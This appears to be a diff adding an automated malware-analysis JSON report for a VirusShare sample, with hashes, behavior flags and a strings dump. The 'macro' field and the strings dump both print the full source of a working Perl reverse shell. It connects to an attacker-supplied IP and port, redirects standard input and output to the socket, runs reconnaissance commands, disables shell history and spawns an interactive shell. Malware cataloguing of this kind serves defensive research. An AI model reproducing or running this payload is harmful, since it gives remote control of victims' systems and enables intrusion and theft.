@@ -1,0 +1,46 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "open": "May open a file",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "#!/usr/bin/perl\nuse Socket;\nuse FileHandle;\n$IP = $ARGV[0];\n$PORT = $ARGV[1];\nsocket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp'));\nconnect(SOCKET, sockaddr_in($PORT,inet_aton($IP)));\nSOCKET->autoflush();\nopen(STDIN, \">&SOCKET\");\nopen(STDOUT,\">&SOCKET\");\nopen(STDERR,\">&SOCKET\");\nsystem(\"id;pwd;uname -a;w;HISTFILE=/dev/null /bin/sh -i\");"
+    },
+    "filename": "VirusShare_3b9af16ddc91c5c198e37c586e4a86a5",
+    "filesize": 358,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "3b9af16ddc91c5c198e37c586e4a86a5",
+        "sha1": "fca1b25751fcdb2e13860396176ce8594a27d214",
+        "sha256": "fd1deeedb81e9032c092e56a878fdb01717e758822530687defbdeda5c5b64d8"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl",
+            "use Socket;",
+            "use FileHandle;",
+            "$IP = $ARGV[0];",
+            "$PORT = $ARGV[1];",
+            "socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname('tcp'));",
+            "connect(SOCKET, sockaddr_in($PORT,inet_aton($IP)));",
+            "SOCKET->autoflush();",
+            "open(STDIN, \">&SOCKET\");",
+            "open(STDOUT,\">&SOCKET\");",
+            "open(STDERR,\">&SOCKET\");",
+            "system(\"id;pwd;uname -a;w;HISTFILE=/dev/null /bin/sh -i\");"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.257695",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
